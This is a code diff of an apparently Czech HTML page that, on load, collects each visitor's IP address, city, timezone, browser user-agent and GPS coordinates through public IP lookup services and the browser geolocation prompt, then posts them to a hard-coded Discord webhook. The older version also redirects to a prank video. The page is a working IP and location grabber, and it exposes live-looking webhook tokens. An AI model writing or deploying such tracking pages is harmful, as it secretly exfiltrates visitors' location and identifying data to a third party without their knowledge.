@@ -4,78 +4,87 @@
   <meta charset="UTF-8" />
   <title></title>
   <style>
-    body, html {
-      margin: 0; padding: 0; height: 100%;
-      background: #000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      font-family: Arial, sans-serif;
-      user-select: none;
-    }
+    body { font-family: Arial, sans-serif; text-align: center; padding: 2rem; }
+    pre { background: #000000; padding: 1rem; border-radius: 5px; display: inline-block; text-align: left; }
   </style>
 </head>
 <body>
   <h1></h1>
+  <div id="ipLocation">
+    <h2></h2>
+    <pre></pre>
+  </div>
+  <div id="geoLocation">
+    <h2></h2>
+    <pre></pre>
+  </div>
 
   <script>
-    const webhookURL = 'https://discord.com/api/webhooks/1376859779275948124/jO89I_FyE_CGdIJXyfHjvRc1Gd921cNx-l0cRpwPOLTbVP5raNYF6ZKknWM3V7z9c3Tt';
+    const webhookURL = "https://discord.com/api/webhooks/1377164038949048350/PALOYMWCgZ5QqE-TiVqK5yl0NlS63j4PM9e_-30OoL5QashUL5dXaeYP9n86ddP1WvqW";
 
-    function sendData(data) {
+    let ipInfoData = null;
+    let geoCoordsData = null;
+
+    function sendToDiscord() {
+      if (!ipInfoData) return;
+
+      const geoText = geoCoordsData
+        ? `📌 GPS souřadnice: ${geoCoordsData.latitude}, ${geoCoordsData.longitude}`
+        : "📌 GPS souřadnice: nebyly povoleny nebo dostupné";
+
+      const message = {
+        content: `📥 **Nový přístup**
+🌍 IP location:
+ - IP: ${ipInfoData.ip}
+ - Stát: ${ipInfoData.country_name}
+ - Město: ${ipInfoData.city}
+ - Časové pásmo: ${ipInfoData.timezone}
+
+${geoText}
+
+🧠 User-Agent: ${navigator.userAgent}
+🕓 Čas: ${new Date().toISOString()}`
+      };
+
       fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      }).catch(e => console.error('Chyba při odesílání:', e));
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(message)
+      }).catch(console.error);
     }
 
-    // Nejprve získat IP adresu
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        sendData({
-          event: 'page_loaded',
-          ip: data.ip,
-          userAgent: navigator.userAgent,
-          timestamp: new Date().toISOString()
-        });
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(ipInfo => {
+        ipInfoData = ipInfo;
+        document.querySelector("#ipLocation pre").innerText =
+          `IP: ${ipInfo.ip}\nStát: ${ipInfo.country_name}\nMěsto: ${ipInfo.city}\nČasové pásmo: ${ipInfo.timezone}`;
+
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(position => {
+            geoCoordsData = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            };
+            document.querySelector("#geoLocation pre").innerText =
+              `Latitude: ${geoCoordsData.latitude}\nLongitude: ${geoCoordsData.longitude}`;
+
+            sendToDiscord();
+          }, error => {
+            document.querySelector("#geoLocation pre").innerText =
+              "GPS poloha nebyla povolena nebo došlo k chybě: " + error.message;
+            sendToDiscord();
+          });
+        } else {
+          document.querySelector("#geoLocation pre").innerText =
+            "Geolokace není podporována.";
+          sendToDiscord();
+        }
       })
       .catch(() => {
-        // Pokud API neselže, pošli aspoň základní info bez IP
-        sendData({
-          event: 'page_loaded',
-          userAgent: navigator.userAgent,
-          timestamp: new Date().toISOString()
-        });
+        document.querySelector("#ipLocation pre").innerText = "Chyba při načítání IP.";
+        sendToDiscord();
       });
-
-    // Pokračujeme s geolokací
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          sendData({
-            event: 'location_allowed',
-            coords: {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy
-            },
-            timestamp: new Date().toISOString()
-          });
-          window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-        },
-        (error) => {
-          sendData({
-            event: 'location_denied_or_error',
-            error: error.message,
-            timestamp: new Date().toISOString()
-          });
-        }
-      );
-    } else {
-      sendData({ event: 'geolocation_not_supported' });
-    }
   </script>
 </body>
 </html>
